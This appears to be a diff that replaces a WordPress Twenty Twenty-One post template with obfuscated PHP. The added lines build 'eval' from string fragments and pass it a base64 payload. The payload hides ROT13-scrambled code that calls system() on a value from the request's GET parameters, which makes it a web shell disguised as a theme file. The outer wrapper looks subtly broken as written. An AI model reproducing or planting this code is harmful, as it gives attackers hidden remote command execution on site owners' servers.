@@ -1,54 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Template part for displaying posts
- *
- * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_One
- * @since Twenty Twenty-One 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3J6Y3luZ3IgY25lZyBzYmUgcXZmY3lubHZhdCBjYmZnZgogKgogKiBAeXZheCB1Z2djZjovL3FyaXJ5YmNyZS5qYmVxY2VyZmYuYmV0L2d1cnpyZi9vbmZ2cGYvZ3J6Y3luZ3ItdXZyZW5lcHVsLwogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbF9CYXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtQmFyIDEuMAogKi8KCj8+Cgo8bmVndnB5ciB2cT1cImNiZmctPD9jdWMgZ3VyX1ZRKCk7ID8+XCIgPD9jdWMgY2JmZ19weW5mZigpOyA/Pj4KCgk8dXJucXJlIHB5bmZmPVwicmFnZWwtdXJucXJlIG55dnRhanZxclwiPgoJCTw/Y3VjIGd1cl9ndmd5ciggJzx1MSBweW5mZj1cInJhZ2VsLWd2Z3lyXCI+JywgJzwvdTE+JyApOyA/PgoJCTw/Y3VjIGdqcmFnbF9nanJhZ2xfYmFyX2NiZmdfZ3Voem9hbnZ5KCk7ID8+Cgk8L3VybnFyZT48IS0tIC5yYWdlbC11cm5xcmUgLS0+CgoJPHF2aSBweW5mZj1cInJhZ2VsLXBiYWdyYWdcIj4KCQk8P2N1YwoJCWd1cl9wYmFncmFnKCk7CgoJCWpjX3l2YXhfY250cmYoCgkJCW5lZW5sKAoJCQkJJ29yc2JlcicgICA9PiAnPGFuaSBweW5mZj1cImNudHIteXZheGZcIiBuZXZuLXlub3J5PVwiJyAuIHJmcF9uZ2dlX18oICdDbnRyJywgJ2dqcmFnbGdqcmFnbGJhcicgKSAuICdcIj4nLAoJCQkJJ25zZ3JlJyAgICA9PiAnPC9hbmk+JywKCQkJCS8qIGdlbmFmeW5nYmVmOiAlOiBDbnRyIGFoem9yZS4gKi8KCQkJCSdjbnRyeXZheCcgPT4gcmZwX3VnenlfXyggJ0NudHIgJScsICdnanJhZ2xnanJhZ2xiYXInICksCgkJCSkKCQkpOwoJCT8+Cgk8L3F2aT48IS0tIC5yYWdlbC1wYmFncmFnIC0tPgoKCTxzYmJncmUgcHluZmY9XCJyYWdlbC1zYmJncmUgcXJzbmh5Zy16bmstanZxZ3VcIj4KCQk8P2N1YyBnanJhZ2xfZ2pyYWdsX2Jhcl9yYWdlbF96cmduX3NiYmdyZSgpOyA/PgoJPC9zYmJncmU+PCEtLSAucmFnZWwtc2JiZ3JlIC0tPgoKCTw/Y3VjIHZzICggISB2Zl9mdmF0aHluZSggJ25nZ25wdXpyYWcnICkgKSA6ID8+CgkJPD9jdWMgdHJnX2dyemN5bmdyX2NuZWcoICdncnpjeW5nci1jbmVnZi9jYmZnL25oZ3ViZS1vdmInICk7ID8+Cgk8P2N1YyByYXF2czsgPz4KCjwvbmVndnB5cj48IS0tICNjYmZnLTw/Y3VjIGd1cl9WUSgpOyA/PiAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
-
-	<header class="entry-header alignwide">
-		<?php the_title( '<h1 class="entry-title">', '</h1>' ); ?>
-		<?php twenty_twenty_one_post_thumbnail(); ?>
-	</header><!-- .entry-header -->
-
-	<div class="entry-content">
-		<?php
-		the_content();
-
-		wp_link_pages(
-			array(
-				'before'   => '<nav class="page-links" aria-label="' . esc_attr__( 'Page', 'twentytwentyone' ) . '">',
-				'after'    => '</nav>',
-				/* translators: %: Page number. */
-				'pagelink' => esc_html__( 'Page %', 'twentytwentyone' ),
-			)
-		);
-		?>
-	</div><!-- .entry-content -->
-
-	<footer class="entry-footer default-max-width">
-		<?php twenty_twenty_one_entry_meta_footer(); ?>
-	</footer><!-- .entry-footer -->
-
-	<?php if ( ! is_singular( 'attachment' ) ) : ?>
-		<?php get_template_part( 'template-parts/post/author-bio' ); ?>
-	<?php endif; ?>
-
-</article><!-- #post-<?php the_ID(); ?> -->
